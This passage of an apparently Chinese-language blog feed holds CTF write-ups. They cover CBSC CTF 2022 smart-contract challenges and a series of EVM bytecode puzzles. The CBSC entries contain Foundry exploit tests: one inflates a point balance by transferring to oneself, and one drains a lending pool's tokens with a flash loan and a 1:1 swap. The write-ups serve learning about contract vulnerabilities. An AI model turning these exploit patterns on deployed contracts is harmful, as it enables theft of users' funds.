0x0000000000000000000000000000000000000000000000000000000000000000;</span><br><span class="line"></span><br><span class="line">        bytes32 computedHash = keccak256(abi.encodePacked(address(this)));</span><br><span class="line">        for (uint256 i = 0; i &lt; proof.length; i++) &#123;</span><br><span class="line">            bytes32 proofElement = proof[i];</span><br><span class="line">            if (computedHash &lt;= proofElement) &#123;</span><br><span class="line">                // Hash(current computed hash + current element of the proof)</span><br><span class="line">                computedHash = keccak256(abi.encodePacked(computedHash, proofElement));</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                // Hash(current element of the proof + current computed hash)</span><br><span class="line">                computedHash = keccak256(abi.encodePacked(proofElement, computedHash));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        root = computedHash;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IMerkle&#123;</span><br><span class="line">    function withdraw(bytes32[] memory,address) external returns(bool);</span><br><span class="line">    function setMerkleroot(bytes32) external ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 16.CBSC 2022 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>02.challenge</title>
      <link href="/2023/07/27/16.CBSC%20CTF%202022/02.challenge/"/>
      <url>/2023/07/27/16.CBSC%20CTF%202022/02.challenge/</url>
      
        <content type="html"><![CDATA[<h1 id="02-challenge"><a href="#02-challenge" class="headerlink" title="02.challenge"></a>02.challenge</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>转账经典老问题：可以转给自己</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../../src/02.challenge/SVip.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attackTest is Test &#123;</span><br><span class="line"></span><br><span class="line">    SVip svip;</span><br><span class="line"></span><br><span class="line">    function setUp() public&#123;</span><br><span class="line">        svip =  new SVip();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isComplete() public &#123;</span><br><span class="line">        // 先获得10分，别999次这么多了，可能gas不足或者达到gaslimit</span><br><span class="line">        for(uint256 i = 0;i &lt; 10; i++)&#123;</span><br><span class="line">            svip.getPoint();</span><br><span class="line">        &#125;</span><br><span class="line">        // 然后用这10分来不断2倍乘，8次够了，我们来个10次</span><br><span class="line">        // 10-20-40-80-160-320-640-1280</span><br><span class="line">        for(uint256 i = 0;i &lt; 10; i++)&#123;</span><br><span class="line">            // 注意要余额减1，因为不能全部分数转出去</span><br><span class="line">            svip.transferPoints(address(this), svip.points(address(this)) - 1);</span><br><span class="line">        &#125;</span><br><span class="line">        // 成为超级VIP</span><br><span class="line">        svip.promotionSVip();</span><br><span class="line">        assertEq(svip.isComplete(),true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 16.CBSC 2022 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01.challenge</title>
      <link href="/2023/07/27/16.CBSC%20CTF%202022/01.challenge/"/>
      <url>/2023/07/27/16.CBSC%20CTF%202022/01.challenge/</url>
      
        <content type="html"><![CDATA[<h1 id="01-challenge"><a href="#01-challenge" class="headerlink" title="01.challenge"></a>01.challenge</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-大局观"><a href="#1-大局观" class="headerlink" title="1.大局观"></a>1.大局观</h3><p>主要有两个合约：</p><ul><li>Cert<ul><li>ERC20代币合约</li><li>加入了一个<code>safeCheek()</code>和<code>grant()</code>，魔改了一下，以为这里会出考点，但是没用到</li></ul></li><li>TrusterLenderPool<ul><li>池子拥有token0和token1</li><li>拥有将此token0和token1交换的<code>swap()</code>，但却是等额交换而非K值，提供token0的闪电贷服务</li></ul></li></ul><h3 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h3><p>将TrusterLenderPool合约的token0余额设置为0，起初token0和token1都有10000个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function Complete() external &#123;</span><br><span class="line">       require(token0.balanceOf(address(this)) == 0);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3.详细分析"></a>3.详细分析</h3><p>既然有闪电贷方法，自然闪电贷就是核心突破点。从闪电贷方法可以看出，我们可以借出池子中所有的token0然后做些事情</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// 闪电贷</span><br><span class="line">function flashLoan(uint256 borrowAmount,address borrower) external nonReentrant&#123;</span><br><span class="line">    // 获取闪电贷之前token0的余额</span><br><span class="line">    uint256 balanceBefore = token0.balanceOf(address(this));</span><br><span class="line">    require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);</span><br><span class="line">    </span><br><span class="line">    // 借给borrower，可以是任意地址</span><br><span class="line">    token0.transfer(borrower, borrowAmount);</span><br><span class="line">    // 回调borrower的receiveEther(uint256)进行还钱</span><br><span class="line">    borrower.functionCall(</span><br><span class="line">        abi.encodeWithSignature(</span><br><span class="line">            &quot;receiveEther(uint256)&quot;,</span><br><span class="line">            borrowAmount</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // 检查token0余额，必须大于等于之前的余额</span><br><span class="line">    uint256 balanceAfter = token0.balanceOf(address(this));</span><br><span class="line">    require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#x27;t been paid back&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>swap()</code>是加减法交换，那么问题是巨大的，因为这么做就失去了token的市场价值规则，会将池子的token耗尽。在本题，我们借到了的token0，可以用来swap，然后池子的token0就会变回原来的值，这样就可以通过闪电贷的还款检验，并且我们拥有token1。然后就可以用token1来换token0完成题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 交换token0和token1，使用之前需要先授权给本合约，这里是等额交换，也就是加减法交换</span><br><span class="line">function swap(address tokenAddress, uint amount) public returns(uint)&#123;</span><br><span class="line">    require(</span><br><span class="line">        // 以 || 为界限，必须上边都为true或下边都为true</span><br><span class="line">        tokenAddress == address(token0) &amp;&amp; token1.transferFrom(msg.sender,address(this),amount)  &amp;&amp; token0.transfer(msg.sender,amount) </span><br><span class="line">        </span><br><span class="line">        ||</span><br><span class="line"></span><br><span class="line">        tokenAddress== address(token1) &amp;&amp; token0.transferFrom(msg.sender,address(this),amount) &amp;&amp; token1.transfer(msg.sender,amount));</span><br><span class="line">    return amount;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../../src/01.challenge/TrusterLenderPool.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attackTest is Test &#123;</span><br><span class="line"></span><br><span class="line">    TrusterLenderPool public pool;</span><br><span class="line">    Cert public token0;</span><br><span class="line">    Cert public token1;</span><br><span class="line"></span><br><span class="line">    function setUp() public&#123;</span><br><span class="line">        pool =  new TrusterLenderPool();</span><br><span class="line">        token0 = Cert(address(pool.token0()));</span><br><span class="line">        token1 = Cert(address(pool.token1()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isComplete() public &#123;</span><br><span class="line">        // 1.闪电贷得到10000的token0 [pool: 0token0,10000token1][me: 10000token0,0token1]</span><br><span class="line">        pool.flashLoan(10000,address(this));</span><br><span class="line">        // 4.授权给pool 10000个token1 [pool: 10000token0,0token1][me: 0token0,10000token1]</span><br><span class="line">        token1.approve(address(pool),10000);</span><br><span class="line">        // 5.将我们的10000个token1换成10000个token0 [pool: 0token0,10000token1][me: 10000token0,0token1]</span><br><span class="line">        pool.swap(address(token0),10000);</span><br><span class="line"></span><br><span class="line">        pool.Complete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function receiveEther(uint256 amount)public&#123;</span><br><span class="line">        // 2.授权给pool 10000个token0 [pool: 0token0,10000token1][me: 10000token0,0token1]</span><br><span class="line">        token0.approve(address(pool),10000);</span><br><span class="line">        // 3.将我们的10000个token0换成10000个token1 [pool: 10000token0,0token1][me: 0token0,10000token1]</span><br><span class="line">        pool.swap(address(token1),10000);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 16.CBSC 2022 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>10.puzzles_10</title>
      <link href="/2023/07/27/15.EVM%20Puzzles/10.puzzles_10/"/>
      <url>/2023/07/27/15.EVM%20Puzzles/10.puzzles_10/</url>
      
        <content type="html"><![CDATA[<h1 id="puzzles-10"><a href="#puzzles-10" class="headerlink" title="puzzles_10"></a>puzzles_10</h1><p>CALLVALUE不得大于代码长度也就是1b。</p><p>CALLDATASIZE取模3要等于0，那么calldata可以是0x。</p><p>CALLVALUE加上0x0a要等于0x19，那么CALLVALUE=25-10=15=0x0f。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#############</span><br><span class="line"># Puzzle 10 #</span><br><span class="line">#############</span><br><span class="line"></span><br><span class="line">00      38          CODESIZE</span><br><span class="line">01      34          CALLVALUE</span><br><span class="line">02      90          SWAP1</span><br><span class="line">03      11          GT</span><br><span class="line">04      6008        PUSH1 08</span><br><span class="line">06      57          JUMPI</span><br><span class="line">07      FD          REVERT</span><br><span class="line">08      5B          JUMPDEST</span><br><span class="line">09      36          CALLDATASIZE</span><br><span class="line">0A      610003      PUSH2 0003</span><br><span class="line">0D      90          SWAP1</span><br><span class="line">0E      06          MOD</span><br><span class="line">0F      15          ISZERO</span><br><span class="line">10      34          CALLVALUE</span><br><span class="line">11      600A        PUSH1 0A</span><br><span class="line">13      01          ADD</span><br><span class="line">14      57          JUMPI</span><br><span class="line">15      FD          REVERT</span><br><span class="line">16      FD          REVERT</span><br><span class="line">17      FD          REVERT</span><br><span class="line">18      FD          REVERT</span><br><span class="line">19      5B          JUMPDEST</span><br><span class="line">1A      00          STOP</span><br><span class="line"></span><br><span class="line">? Enter the value to send: 15</span><br><span class="line">? Enter the calldata: 0x</span><br><span class="line"></span><br><span class="line">Puzzle solved!</span><br></pre></td></tr></table></figure><p>完结</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">? Do you want to play the next puzzle? Yes</span><br><span class="line"></span><br><span class="line">All puzzles are solved!</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 15.EVM Puzzles </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>09.puzzles_9</title>
      <link href="/2023/07/27/15.EVM%20Puzzles/09.puzzles_9/"/>
      <url>/2023/07/27/15.EVM%20Puzzles/09.puzzles_9/</url>
      
        <content type="html"><![CDATA[<h1 id="puzzles-9"><a href="#puzzles-9" class="headerlink" title="puzzles_9"></a>puzzles_9</h1><p>输入的calldata需要大于3。calldata的长度和VALLVALUE相乘的结果要等于8。那我们设置calldata长度为4，为0x00000000，CALLVALUE=2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 9 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      36        CALLDATASIZE</span><br><span class="line">01      6003      PUSH1 03</span><br><span class="line">03      10        LT</span><br><span class="line">04      6009      PUSH1 09</span><br><span class="line">06      57        JUMPI</span><br><span class="line">07      FD        REVERT</span><br><span class="line">08      FD        REVERT</span><br><span class="line">09      5B        JUMPDEST</span><br><span class="line">0A      34        CALLVALUE</span><br><span class="line">0B      36        CALLDATASIZE</span><br><span class="line">0C      02        MUL</span><br><span class="line">0D      6008      PUSH1 08</span><br><span class="line">0F      14        EQ</span><br><span class="line">10      6014      PUSH1 14</span><br><span class="line">12      57        JUMPI</span><br><span class="line">13      FD        REVERT</span><br><span class="line">14      5B        JUMPDEST</span><br><span class="line">15      00        STOP</span><br><span class="line"></span><br><span class="line">? Enter the value to send: 2</span><br><span class="line">? Enter the calldata: 0x00000000</span><br><span class="line"></span><br><span class="line">Puzzle solved!</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 15.EVM Puzzles </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>08.puzzles_8</title>
      <link href="/2023/07/27/15.EVM%20Puzzles/08.puzzles_8/"/>
      <url>/2023/07/27/15.EVM%20Puzzles/08.puzzles_8/</url>
      
        <content type="html"><![CDATA[<h1 id="puzzles-8"><a href="#puzzles-8" class="headerlink" title="puzzles_8"></a>puzzles_8</h1><p>分为三部分</p><ul><li>将calldata放到memory</li><li>从memory选取内容创建合约</li><li>调用合约的内容需要返回0，也就是执行失败报错</li></ul><p>其实就是要求我们输入一个initcode，然后该runtimecode会部署到合约地址上面，call调用它的时候需要失败报错。上一题puzzles_7我们写了一个initcode，它部署的runtimecode是ff，也就是sefldestruct，因为只有一个ff而没有提供地址，因此会执行失败报错，所以这个initcode也符合本题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 8 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      36        CALLDATASIZE</span><br><span class="line">01      6000      PUSH1 00</span><br><span class="line">03      80        DUP1</span><br><span class="line">04      37        CALLDATACOPY</span><br><span class="line">05      36        CALLDATASIZE</span><br><span class="line">06      6000      PUSH1 00</span><br><span class="line">08      6000      PUSH1 00</span><br><span class="line">0A      F0        CREATE</span><br><span class="line">0B      6000      PUSH1 00</span><br><span class="line">0D      80        DUP1</span><br><span class="line">0E      80        DUP1</span><br><span class="line">0F      80        DUP1</span><br><span class="line">10      80        DUP1</span><br><span class="line">11      94        SWAP5</span><br><span class="line">12      5A        GAS</span><br><span class="line">13      F1        CALL</span><br><span class="line">14      6000      PUSH1 00</span><br><span class="line">16      14        EQ</span><br><span class="line">17      601B      PUSH1 1B</span><br><span class="line">19      57        JUMPI</span><br><span class="line">1A      FD        REVERT</span><br><span class="line">1B      5B        JUMPDEST</span><br><span class="line">1C      00        STOP</span><br><span class="line"></span><br><span class="line">? Enter the calldata: 0x60ff6000526001601ff3</span><br><span class="line"></span><br><span class="line">Puzzle solved!</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 15.EVM Puzzles </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>07.puzzles_7</title>
      <link href="/2023/07/27/15.EVM%20Puzzles/07.puzzles_7/"/>
      <url>/2023/07/27/15.EVM%20Puzzles/07.puzzles_7/</url>
      
        <content type="html"><![CDATA[<h1 id="puzzles-7"><a href="#puzzles-7" class="headerlink" title="puzzles_7"></a>puzzles_7</h1><p>几个考点</p><ul><li>RETURN：执行从内存中选取的代码作为initcode，然后执行完成之后，把代码部署到address中</li><li>本题需要我们创建的合约的代码长度为1，也就是说runtimecode长度为1</li></ul><p>那么我们写一个initcode来返回长度为1的runtimecode，思路如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">## 把ff放进栈，任意内容都可以，只要是一个字节即可</span><br><span class="line">PUSH1 ff       </span><br><span class="line">PUSH1 00   </span><br><span class="line">## 把ff放进memory </span><br><span class="line">MSTORE        </span><br><span class="line">## 将ff从内存返回作为runtimecode</span><br><span class="line">PUSH1 31</span><br><span class="line">PUSH1 1</span><br><span class="line">RETURN </span><br></pre></td></tr></table></figure><p>写成的initcode为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">60 ff</span><br><span class="line">60 00</span><br><span class="line">52</span><br><span class="line">60 01</span><br><span class="line">60 1f</span><br><span class="line">f3</span><br><span class="line"></span><br><span class="line">60ff6000526001601ff3</span><br></pre></td></tr></table></figure><p>完成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 7 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      36        CALLDATASIZE</span><br><span class="line">01      6000      PUSH1 00</span><br><span class="line">03      80        DUP1</span><br><span class="line">04      37        CALLDATACOPY</span><br><span class="line">05      36        CALLDATASIZE</span><br><span class="line">06      6000      PUSH1 00</span><br><span class="line">08      6000      PUSH1 00</span><br><span class="line">0A      F0        CREATE</span><br><span class="line">0B      3B        EXTCODESIZE</span><br><span class="line">0C      6001      PUSH1 01</span><br><span class="line">0E      14        EQ</span><br><span class="line">0F      6013      PUSH1 13</span><br><span class="line">11      57        JUMPI</span><br><span class="line">12      FD        REVERT</span><br><span class="line">13      5B        JUMPDEST</span><br><span class="line">14      00        STOP</span><br><span class="line"></span><br><span class="line">? Enter the calldata: 0x60ff6000526001601ff3</span><br><span class="line"></span><br><span class="line">Puzzle solved!</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 15.EVM Puzzles </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>06.puzzles_6</title>
      <link href="/2023/07/27/15.EVM%20Puzzles/06.puzzles_6/"/>
      <url>/2023/07/27/15.EVM%20Puzzles/06.puzzles_6/</url>
      
        <content type="html"><![CDATA[<h1 id="puzzles-6"><a href="#puzzles-6" class="headerlink" title="puzzles_6"></a>puzzles_6</h1><p>CALLDATALOAD获取从calldata位置0~32的内容，需要是0x0a才能成功跳转。</p><p>因此输入0x000000000000000000000000000000000000000000000000000000000000000a</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 6 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      6000      PUSH1 00</span><br><span class="line">02      35        CALLDATALOAD</span><br><span class="line">03      56        JUMP</span><br><span class="line">04      FD        REVERT</span><br><span class="line">05      FD        REVERT</span><br><span class="line">06      FD        REVERT</span><br><span class="line">07      FD        REVERT</span><br><span class="line">08      FD        REVERT</span><br><span class="line">09      FD        REVERT</span><br><span class="line">0A      5B        JUMPDEST</span><br><span class="line">0B      00        STOP</span><br><span class="line"></span><br><span class="line">? Enter the calldata: 0x000000000000000000000000000000000000000000000000000000000000000a</span><br><span class="line"></span><br><span class="line">Puzzle solved!</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 15.EVM Puzzles </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>05.puzzles_5</title>
      <link href="/2023/07/27/15.EVM%20Puzzles/05.puzzles_5/"/>
      <url>/2023/07/27/15.EVM%20Puzzles/05.puzzles_5/</url>
      
        <content type="html"><![CDATA[<h1 id="puzzles-5"><a href="#puzzles-5" class="headerlink" title="puzzles_5"></a>puzzles_5</h1><p>将CALLVALUE相乘，然后看看和0x100是否相等，如果相等就设置为1否则是0。然后JUMPI如果是1则跳转到JUMPDEST。那么我们输入CALLVALUE=16即可相乘得到0x100完成题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 5 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      34          CALLVALUE</span><br><span class="line">01      80          DUP1</span><br><span class="line">02      02          MUL</span><br><span class="line">03      610100      PUSH2 0100</span><br><span class="line">06      14          EQ</span><br><span class="line">07      600C        PUSH1 0C</span><br><span class="line">09      57          JUMPI</span><br><span class="line">0A      FD          REVERT</span><br><span class="line">0B      FD          REVERT</span><br><span class="line">0C      5B          JUMPDEST</span><br><span class="line">0D      00          STOP</span><br><span class="line">0E      FD          REVERT</span><br><span class="line">0F      FD          REVERT</span><br><span class="line"></span><br><span class="line">? Enter the value to send: 16</span><br><span class="line"></span><br><span class="line">Puzzle solved!</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 15.EVM Puzzles </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01.puzzles_1</title>
      <link href="/2023/07/27/15.EVM%20Puzzles/01.puzzles_1/"/>
      <url>/2023/07/27/15.EVM%20Puzzles/01.puzzles_1/</url>
      
        <content type="html"><![CDATA[<h1 id="puzzles-1"><a href="#puzzles-1" class="headerlink" title="puzzles_1"></a>puzzles_1</h1><p>考察JUMP，JUMP读取栈顶的第一个元素的值，然后跳转该值的位置，并且该位置必须是JUMPDEST。因此我们设置CALLVALUE=8即可跳转，执行完成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">############</span><br><span class="line"># Puzzle 1 #</span><br><span class="line">############</span><br><span class="line"></span><br><span class="line">00      34      CALLVALUE</span><br><span class="line">01      56      JUMP</span><br><span class="line">02      FD      REVERT</span><br><span class="line">03      FD      REVERT</span><br><span class="line">04      FD      REVERT</span><br><span class="line">05      FD      REVERT</span><br><span class="line">06      FD      REVERT</span><br><span class="line">07      FD      REVERT</span><br><span class="line">08      5B      JUMPDEST</span><br><span class="line">09      00      STOP</span><br><span class="line"></span><br><span class="line">? Enter the value to send: 8</span><br><span class="line"></span><br><span class="line">Puzzle solved!</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 15.EVM Puzzles </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>02.puzzles_2</title>
      <link href="/2023/07/27/15.EVM%20Puzzles/02.puzzles_2/"/>
      <url>/2023/07/27/15.EVM%20Puzzles/02.puzzles_2/</url>
      
